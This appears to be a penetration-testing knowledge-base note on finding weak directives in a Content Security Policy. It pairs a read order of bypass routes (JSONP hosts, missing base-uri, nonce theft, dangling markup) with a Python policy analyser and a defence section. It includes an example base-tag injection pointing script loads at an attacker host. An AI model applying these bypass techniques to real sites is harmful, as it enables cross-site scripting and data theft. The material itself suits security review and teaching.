---
title: "CSP - Reading a Policy for Its Weakest Directive"
category: web
subcategory: xss
type: technique
tags: [csp, content-security-policy, script-src, base-uri, object-src, nonce, strict-dynamic, unsafe-eval, unsafe-inline, jsonp, script-gadget, dangling-markup, default-src, frame-ancestors, form-action, trusted-types, csp-evaluator, burp]
difficulty: medium
summary: "A CSP is only as strong as its weakest directive; read it directive by directive and the gap is usually structural, not clever."
when_to_use:
  - "You have HTML injection but nothing executes, and the console shows a CSP violation"
  - "You need to decide whether a policy is worth attacking before spending time on it"
  - "The policy uses nonces, `strict-dynamic`, or a CDN allowlist"
  - "You are reviewing a policy and want to know what it actually buys"
tools: [burp, csp-evaluator]
related: [xss-contexts, xss-dom-clobbering, xss-sanitizer-bypass, xss-exfiltration-and-bots]
---

## TL;DR

CSP is a deny-by-default allowlist applied per resource type. Bypassing one is almost never a trick - it is
reading the policy and noticing that some directive is missing, that some allowlisted host serves
attacker-influenced JavaScript, or that the policy permits a mechanism (`unsafe-eval`, a missing `base-uri`)
that re-opens execution. The skill is a systematic read, in a fixed order, of what each directive does and
does not cover.

## Recognise it

- Console: `Refused to execute inline script because it violates the following Content Security Policy
  directive: ...`. The message names the directive that blocked you, which is the single most useful piece of
  information available.
- The `Content-Security-Policy` response header, or a `<meta http-equiv>` equivalent. Check both - a meta
  policy applies only to what follows it in the document.
- `Content-Security-Policy-Report-Only` means **nothing is enforced**. It is telemetry. Do not spend time
  bypassing it.
- A nonce that is identical across two fresh requests - a static nonce is not a nonce.
- Allowlisted hosts that are CDNs hosting arbitrary libraries.

## Theory

### The read order

Work through these questions in order; the first "yes" is usually the answer.

**1. Is it enforced?** Report-Only is not a control.

**2. What does `script-src` fall back to?** If `script-src` is absent, `default-src` applies. If both are
absent, scripts are unrestricted and there is no policy worth discussing.

**3. Does `script-src` contain `'unsafe-inline'`?** Then inline script runs and the policy provides no XSS
protection at all. Note the interaction: a nonce or hash in the same directive causes modern browsers to
**ignore** `'unsafe-inline'`, which is how policies stay backward-compatible with old browsers. So
`'unsafe-inline'` alongside a nonce is not a bypass in a current browser.

**4. Does it contain `'unsafe-eval'`?** Then string-to-code sinks are live: `eval`, `new Function`,
`setTimeout('...')`. On its own this is not execution - you still need a way to reach one of those sinks with
your data. That is what a *script gadget* is: existing, allowlisted code that takes data from the DOM and
passes it to a code-evaluating sink. Client-side template frameworks are the classic source of gadgets,
because interpreting expressions from markup is their job.

**5. Are there allowlisted hosts, and do any serve JSONP?** A JSONP endpoint takes a callback name from the
query string and reflects it into executable JavaScript. If such an endpoint is on an allowlisted origin, the
allowlist is defeated - you load a script from an approved host whose content you control. The same applies
to any allowlisted host that serves user-uploaded files, an open redirect (which can bounce to your content
while remaining the allowlisted origin in the check), or a full copy of a framework with known gadgets.
Allowlisting a large CDN effectively allowlists everything on it.

**6. Is `base-uri` missing?** This is the most commonly overlooked directive. A `<base href="https://attacker.example/">`
element changes the resolution of every **relative** URL in the document, including relative `src` values on
script elements. With a nonce-based policy, the nonce is attached to the element, not the URL - so a
legitimate `<script nonce=... src="/app.js">` will happily load `https://attacker.example/app.js` and execute
it with the nonce's blessing. Injecting a `<base>` tag requires only HTML injection above the script tag in
document order. `base-uri 'none'` or `base-uri 'self'` closes it, and a great many real policies omit it.

**7. Is `object-src` missing?** `default-src` covers it if present; if neither is set, plugin content is
allowed. Historically this permitted Flash-based execution; the practical modern reason to set
`object-src 'none'` is that it costs nothing.

**8. How are nonces generated?** A nonce must be unpredictable and fresh per response. Failure modes: a
static nonce baked into a template; a nonce derived from something guessable; the same nonce reused across
cached responses; or a nonce that appears somewhere readable in the page, so that a *dangling markup*
injection can capture it. If you can read the nonce, you can use it.

**9. Does it use `'strict-dynamic'`?** This changes the model substantially: host allowlists and `'self'`
are **ignored** for script loading, and instead any script loaded by an already-trusted script is itself
trusted, transitively. That is a genuine improvement - it makes the JSONP and CDN problems irrelevant. But it
has a consequence: if you can get *trusted* code to inject a script element with your URL (through a DOM-XSS
sink or a script gadget), `strict-dynamic` propagates trust to it. Note that the propagation applies to
script elements created by trusted script, not to `document.write`, and not to inline handlers.

**10. Can you exfiltrate without executing?** If script is genuinely blocked, injected markup can still leak
data. **Dangling markup**: inject an unterminated attribute so that the following bytes of the document -
including a CSRF token or a nonce - are consumed into a URL that the browser then requests. Whether this
works depends on whether a connecting directive (`img-src`, `default-src`) permits your host, and modern
browsers block some of the most convenient forms. CSS-based exfiltration with attribute selectors is the
related technique, covered in `xss-exfiltration-and-bots`.

**11. Are the non-script directives set?** `frame-ancestors` (clickjacking and postMessage reachability),
`form-action` (where injected forms can post to), and `connect-src` (where fetch/XHR can go) all matter for
what an injection can *do* even when it cannot execute.

### What CSP does not do

- It does not stop HTML injection, only execution.
- It does not protect against DOM clobbering, which changes what trusted code reads without running anything.
- It does not stop data exfiltration through permitted channels - a policy allowing `img-src *` allows leaks.
- It is not a substitute for output encoding. It is a second layer for when encoding is missed.

## Attack

1. Capture the header. Check it is enforced, not report-only.
2. Walk the read order above. Stop at the first gap.
3. If the gap is a missing directive (`base-uri`, `object-src`), confirm it by injecting the corresponding
   element and watching the console.
4. If the gap is an allowlisted host, enumerate what that host serves - JSONP endpoints, old framework
   versions, user uploads, open redirects.
5. If there is no script gap, pivot to what the policy still permits: exfiltration channels, form-action,
   framing.
6. Re-read the console on every attempt. CSP tells you precisely which directive refused, which turns
   guessing into a search.

## Code

A policy analyser: parse a CSP, apply the read order above, and rank the findings. This is the triage step
made mechanical - it tells you which directive to look at first, not what to send.

```python
#!/usr/bin/env python3
"""Parse a Content-Security-Policy and rank its weaknesses.

Implements the directive-by-directive read order: fallback semantics, the
keyword sources, missing base-uri/object-src, nonce quality and strict-dynamic.
Reports findings ordered by severity.

Offline; parses a header string.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field

FETCH_DIRECTIVES = {
    "script-src", "style-src", "img-src", "connect-src", "font-src",
    "object-src", "media-src", "frame-src", "worker-src", "child-src",
}
SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "info": 3}

# Hosts that commonly serve JSONP endpoints or arbitrary user-hosted libraries.
# Allowlisting any of these tends to make a host allowlist meaningless.
BROAD_HOSTS = {
    "*", "https:", "http:", "data:",
    "*.googleapis.com", "ajax.googleapis.com", "*.google.com",
    "cdnjs.cloudflare.com", "cdn.jsdelivr.net", "unpkg.com",
    "*.amazonaws.com", "s3.amazonaws.com",
}


@dataclass
class Policy:
    directives: dict[str, list[str]] = field(default_factory=dict)
    report_only: bool = False

    def effective(self, name: str) -> list[str] | None:
        """Resolve a fetch directive through the default-src fallback."""
        if name in self.directives:
            return self.directives[name]
        if name in FETCH_DIRECTIVES and "default-src" in self.directives:
            return self.directives["default-src"]
        return None


@dataclass
class Finding:
    severity: str
    directive: str
    detail: str

    def __str__(self) -> str:
        return f"  [{self.severity:<8}] {self.directive:<14} {self.detail}"


def parse(header: str, *, report_only: bool = False) -> Policy:
    directives: dict[str, list[str]] = {}
    for chunk in header.split(";"):
        parts = chunk.split()
        if not parts:
            continue
        directives[parts[0].lower()] = parts[1:]
    return Policy(directives, report_only)


def _nonces(values: list[str]) -> list[str]:
    return [v[len("'nonce-"):-1] for v in values if v.lower().startswith("'nonce-")]


def analyse(policy: Policy, *, seen_nonces: set[str] | None = None) -> list[Finding]:
    out: list[Finding] = []
    if policy.report_only:
        out.append(Finding("critical", "(policy)", "Report-Only: nothing is enforced"))
        return out

    script = policy.effective("script-src")
    if script is None:
        out.append(Finding("critical", "script-src",
                           "absent and no default-src: scripts are unrestricted"))
        return out

    lowered = [v.lower() for v in script]
    has_nonce = any(v.startswith("'nonce-") for v in lowered)
    has_hash = any(v.startswith("'sha") for v in lowered)
    strict_dynamic = "'strict-dynamic'" in lowered

    # 'unsafe-inline' is ignored by modern browsers when a nonce or hash is present.
    if "'unsafe-inline'" in lowered:
        if has_nonce or has_hash:
            out.append(Finding("info", "script-src",
                               "'unsafe-inline' present but ignored (nonce/hash also present)"))
        else:
            out.append(Finding("critical", "script-src",
                               "'unsafe-inline': inline script executes - no XSS protection"))

    if "'unsafe-eval'" in lowered:
        out.append(Finding("high", "script-src",
                           "'unsafe-eval': eval/Function/setTimeout(string) live - look for a script gadget"))

    # Host allowlists are ignored when strict-dynamic is in force.
    hosts = [v for v in script if not v.startswith("'")]
    if strict_dynamic:
        out.append(Finding("info", "script-src",
                           "'strict-dynamic': host allowlist ignored; trust propagates from trusted script"))
        if hosts:
            out.append(Finding("info", "script-src",
                               f"{len(hosts)} host(s) listed but inert under strict-dynamic"))
    else:
        for host in hosts:
            if host in BROAD_HOSTS or host.startswith("*"):
                out.append(Finding("high", "script-src",
                                   f"broad host {host!r}: JSONP endpoints or user content defeat the allowlist"))
        if "'self'" in lowered:
            out.append(Finding("medium", "script-src",
                               "'self': any file you can upload or reflect on-origin becomes a script source"))

    # Nonce quality.
    for nonce in _nonces(script):
        if len(nonce) < 16:
            out.append(Finding("high", "script-src", f"short nonce ({len(nonce)} chars) - may be guessable"))
        if seen_nonces is not None and nonce in seen_nonces:
            out.append(Finding("critical", "script-src",
                               "nonce reused across responses - it is a static secret, not a nonce"))
        if seen_nonces is not None:
            seen_nonces.add(nonce)

    # The two most-omitted directives.
    if "base-uri" not in policy.directives:
        sev = "critical" if (has_nonce or has_hash) else "high"
        out.append(Finding(sev, "base-uri",
                           "missing: an injected <base> redirects relative script src, inheriting the nonce"))
    if policy.effective("object-src") is None:
        out.append(Finding("medium", "object-src", "missing and no default-src fallback"))
    elif "'none'" not in [v.lower() for v in policy.effective("object-src")]:
        out.append(Finding("medium", "object-src", "not 'none': plugin content still permitted"))

    # Directives that shape what an injection can do even without execution.
    if "frame-ancestors" not in policy.directives:
        out.append(Finding("medium", "frame-ancestors",
                           "missing: page can be framed - clickjacking and postMessage reach"))
    if "form-action" not in policy.directives:
        out.append(Finding("medium", "form-action",
                           "missing: an injected form can post anywhere"))
    conn = policy.effective("connect-src")
    img = policy.effective("img-src")
    if (conn is None or "*" in conn) and (img is None or "*" in img):
        out.append(Finding("medium", "connect-src",
                           "no egress restriction: exfiltration channels open even if script is blocked"))
    if "require-trusted-types-for" in policy.directives:
        out.append(Finding("info", "trusted-types", "Trusted Types enforced - DOM sinks reject plain strings"))

    out.sort(key=lambda f: SEVERITY_ORDER.get(f.severity, 9))
    return out


def verdict(findings: list[Finding]) -> str:
    if any(f.severity == "critical" for f in findings):
        return "broken - a critical gap re-opens script execution"
    if any(f.severity == "high" for f in findings):
        return "weak - a high-severity gap is likely exploitable"
    if any(f.severity == "medium" for f in findings):
        return "reasonable for script, gaps elsewhere"
    return "strong"


SAMPLES = {
    "unsafe-inline (no protection)":
        "default-src 'self'; script-src 'self' 'unsafe-inline'",
    "CDN allowlist (JSONP risk)":
        "script-src 'self' ajax.googleapis.com; object-src 'none'; base-uri 'none'",
    "nonce but no base-uri":
        "script-src 'nonce-r4nd0mvalue0123456'; object-src 'none'",
    "strict-dynamic, complete":
        ("script-src 'nonce-r4nd0mvalue0123456' 'strict-dynamic'; object-src 'none'; "
         "base-uri 'none'; frame-ancestors 'none'; form-action 'self'; connect-src 'self'; "
         "img-src 'self'; require-trusted-types-for 'script'"),
    "no script-src at all":
        "img-src 'self'",
}


if __name__ == "__main__":
    for name, header in SAMPLES.items():
        policy = parse(header)
        findings = analyse(policy)
        print(f"\n{name}\n  {header[:96]}")
        for finding in findings:
            print(finding)
        print(f"  => {verdict(findings)}")

    # 'unsafe-inline' with no nonce is the end of the analysis.
    f = analyse(parse(SAMPLES["unsafe-inline (no protection)"]))
    assert any(x.severity == "critical" and "'unsafe-inline'" in x.detail for x in f)

    # A nonce policy missing base-uri is critical, because the nonce is inherited.
    f = analyse(parse(SAMPLES["nonce but no base-uri"]))
    assert any(x.directive == "base-uri" and x.severity == "critical" for x in f), \
        "missing base-uri is worse, not better, when nonces are in use"

    # A CDN allowlist is a high finding even though the policy looks tidy.
    f = analyse(parse(SAMPLES["CDN allowlist (JSONP risk)"]))
    assert any("ajax.googleapis.com" in x.detail for x in f)

    # strict-dynamic makes the host allowlist inert rather than dangerous.
    f = analyse(parse("script-src 'nonce-abcdefghijklmnop' 'strict-dynamic' *; base-uri 'none'; "
                      "object-src 'none'; frame-ancestors 'none'; form-action 'self'; "
                      "connect-src 'self'; img-src 'self'"))
    assert not any(x.severity in ("critical", "high") for x in f), \
        "a wildcard host is ignored under strict-dynamic"

    # The complete policy has no script-execution gap.
    f = analyse(parse(SAMPLES["strict-dynamic, complete"]))
    assert verdict(f) == "strong", [str(x) for x in f]

    # Report-Only short-circuits everything.
    f = analyse(parse("script-src 'none'", report_only=True))
    assert len(f) == 1 and f[0].severity == "critical"

    # Nonce reuse across two responses is detected by carrying state.
    seen: set[str] = set()
    analyse(parse("script-src 'nonce-samevalue12345678'; base-uri 'none'"), seen_nonces=seen)
    f = analyse(parse("script-src 'nonce-samevalue12345678'; base-uri 'none'"), seen_nonces=seen)
    assert any("reused" in x.detail for x in f), "second response with the same nonce is a static nonce"

    print("\nself-test ok")
```

## Variants & pitfalls

- **Report-Only wastes time.** Check the header name first.
- **`'unsafe-inline'` next to a nonce is inert** in modern browsers. Do not report it as the bypass.
- **A meta-tag policy only covers what follows it**, and cannot set `frame-ancestors`, `report-uri` or
  `sandbox`.
- **Multiple CSP headers intersect.** Two policies are both enforced, and the result is the *most*
  restrictive, not the least. A second header cannot loosen the first.
- **`strict-dynamic` is not a bypass by itself.** It removes the host-allowlist attack surface; the residual
  risk is trust propagation through a DOM sink.
- **`'self'` is broader than it looks** on a site with file uploads, open redirects, or any reflection that
  can be served with a JavaScript content type.
- **The console names the directive.** Read it before hypothesising.
- **Missing `base-uri` is the single most common structural gap** in otherwise-modern nonce policies.
- **A policy can be strong for script and useless for exfiltration** - they are different directives.

### Defence / what closes this

Build the policy around nonces plus `'strict-dynamic'` rather than a host allowlist: allowlists are defeated
by whatever the allowlisted host happens to serve, while `strict-dynamic` makes that irrelevant. Generate a
fresh, unpredictable nonce per response (at least 128 bits of entropy, base64-encoded) and never cache a
response with its nonce. Always set `base-uri 'none'` and `object-src 'none'` - both are cheap and both close
real gaps. Do not include `'unsafe-eval'`; if a framework requires it, that is a reason to change the
framework's configuration. Set `frame-ancestors`, `form-action` and a restrictive `connect-src`/`img-src` so
that an injection that cannot execute also cannot exfiltrate. Add `require-trusted-types-for 'script'` to
turn DOM-sink misuse into an error. Deploy in Report-Only first to find breakage, then switch to enforcing -
and remember that leaving it in Report-Only means you have monitoring, not a control. Above all, keep
context-correct output encoding as the primary defence; CSP is the second layer.

## Tools

- Google CSP Evaluator - https://csp-evaluator.withgoogle.com/ - the reference implementation of this read order.
- Burp Suite - the Proxy history shows the header per response, which is how you spot nonce reuse.
- Browser console - names the refusing directive on every violation.
- `curl -sI <url> | grep -i content-security-policy` - fastest first look.

## References

- MDN, Content Security Policy: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
- W3C CSP Level 3: https://www.w3.org/TR/CSP3/
- PortSwigger, content security policy: https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- OWASP Content Security Policy Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
- "CSP Is Dead, Long Live CSP" (Weichselbaum et al., ACM CCS 2016): https://research.google/pubs/pub45542/
- W3C Trusted Types: https://w3c.github.io/trusted-types/dist/spec/
